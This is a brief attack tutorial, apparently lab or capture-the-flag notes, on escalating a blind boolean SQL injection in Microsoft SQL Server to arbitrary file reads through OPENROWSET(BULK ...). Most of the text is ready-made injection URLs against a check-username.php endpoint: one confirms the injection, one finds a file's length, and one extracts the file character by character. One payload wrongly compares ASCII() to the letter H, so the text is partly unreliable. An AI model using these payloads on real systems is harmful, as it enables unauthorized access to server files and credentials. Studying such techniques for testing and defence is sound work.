This document will treat how to go from a MSSQLi Blind Boolean -> FileRead via OPENROWSET.

### Case Scenario
We found our MSSQLi entry point via Blind Boolean which makes our life a bit more difficult since we can only deal with TRUE/FALSE for our ex-filtration.
`api/check-username.php?u=maria' AND 1=1-- -`
(Always true as maria user exist and 1=1 is true)

## Limitations
The BULK option requires the ADMINISTER BULK OPERATIONS or the ADMINISTER DATABASE BULK OPERATIONS permission.

## Attacking Scenario
You might want to automate this via a example poweshell script. 
To read a file you need to use this as base query
`<SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents>`

1)First you need to identify the file length (stop when get "taken")
`api/check-username.php?u=maria' AND (SELECT LEN(BulkColumn) FROM OPENROWSET(BULK 'C:/Windows/System32/flag.txt', SINGLE_CLOB) AS Contents)=30-- -`

2)You start the ex-filtration guessing (stop when get "taken")
`api/check-username.php?u=maria' AND ASCII((SELECT SUBSTRING(BulkColumn,1,1) FROM OPENROWSET(BULK 'C:/Windows/System32/flag.txt', SINGLE_CLOB) AS Contents))=H-- -`

3)Automating these steps will eventually make it thru.